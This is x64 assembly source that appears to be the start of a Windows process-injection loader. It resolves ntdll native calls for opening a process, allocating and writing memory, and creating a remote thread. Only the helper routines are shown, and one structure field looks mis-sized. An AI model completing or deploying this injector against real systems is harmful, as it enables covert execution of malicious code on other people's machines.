extern GetModuleHandleA:PROC 
extern GetProcAddress:PROC
extern ExitProcess:PROC

OBJECT_ATTRIBUTES STRUCT
    oLength QWORD ?
    RootDirectory QWORD ?
    ObjectName QWORD ?
    Attributes QWORD ?
    SecurityDescriptor QWORD ?
    SecurityQualityOfService QWORD ?
OBJECT_ATTRIBUTES ENDS

CLIENT_ID STRUCT
    UniqueProcess DWORD ?
    UniqueThread QWORD ?
CLIENT_ID ENDS

.data
	ObjAttr OBJECT_ATTRIBUTES <> 
	CID     CLIENT_ID <>

	
	HandleProcess QWORD 0
	HandleThread QWORD 0
	RemoteBuffer QWORD 0
	NTDLLAddress QWORD 0

	; /* DLL */
	NTDLLString	db "ntdll.dll",0

	; /* Functions */ 
	NtOpenProcessString	db "NtOpenProcess",0
	NtAllocateVirtualString db "NtAllocateVirtualMemory",0
	NtWriteVirtualString db "NtWriteVirtualMemory",0
    NtProtectVirtualString db "NtProtectVirtualMemory",0
	NtCreateThreadString db "NtCreateThreadEx",0
	NtWaitString db "NtWaitForSingleObject",0
	NtCloseString db "NtClose",0

.code

; /*
;   This function checks the result of a function call and handles errors. Also it can copy the result to a buffer.
;
;   * Parameters:
;       * rcx - The result of the function call (QWORD)
;       * rdx - The address of the buffer to store the result (QWORD) (OPTIONAL)
; */
CheckFunctionResult PROC
    mov r10,rcx
    mov r11,rdx

    cmp r10,0
    jz GotoExit 

    cmp r11,0
    jz ReturnToMain

CopyBuffer:
    ; Copy the result to the buffer
    mov [r11],r10 
    jmp ReturnToMain

GotoExit:
    mov rdx,HandleThread
    mov rcx,HandleProcess
    jmp ExitProgram

ReturnToMain:
    ret
CheckFunctionResult ENDP


; /*
;   This function gets the address of a specific function from a module.
;   * Parameters:
;   * rcx - The address of the module (QWORD)
;   * rdx - The name of the function (QWORD)
;   
;   Output:
;   * rax - The address of the function
GetSpecificFunction PROC
    cmp rcx,0
    jz NotFoundParam

    cmp rdx,0
    jz NotFoundParam
    
    ; Prolog
    push r13
    push r14
    push r15
    sub rsp,38h

    ; Call GetProcAddress with Params
    sub rsp,28h
    call GetProcAddress
    add rsp,28h

    ; Epilog 
    add rsp,38h
    pop r15
    pop r14
    pop r13
    
    jmp Return

NotFoundParam:
	xor rax,rax

Return:
	ret
GetSpecificFunction ENDP


; /* 
;	This function closes the handles and exits the program.
;
;	* Parameters: 
;	    * rcx - Thread's handle  (QWORD)
;	    * rdx - Process's handle (QWORD)
; */
ExitProgram PROC
    ; Save Params
    mov r13,rcx
    mov r14,rdx

    ; Get the Address of NtClose
    lea rdx,[NtCloseString]
    mov rcx,NTDLLAddress
    call GetSpecificFunction

    xor rdx,rdx
    mov rcx,rax 
    call CheckFunctionResult

    ; Save NtClose Address
    mov r15,rax

    ; Check HandleThread
    cmp r13,0
    jz CheckHandleProcess

    jmp CloseThreadHandle

CheckHandleProcess:
    cmp r14,0
    jz ExitTheProgram
    
    jmp CloseProcessHandle

CloseThreadHandle:
    ; Call NtClose for HandleThread
    sub rsp,28h
    mov rcx,r13
    call rax 
    add rsp,28h

    jmp CheckHandleProcess

CloseProcessHandle:
    ; Call NtClose for HandleProcess
    mov rax,r15

    sub rsp,28h
    mov rcx,r14
    call rax 
    add rsp,28h

ExitTheProgram:
    sub rsp,28h
    xor rcx,rcx
    call ExitProcess
ExitProgram ENDP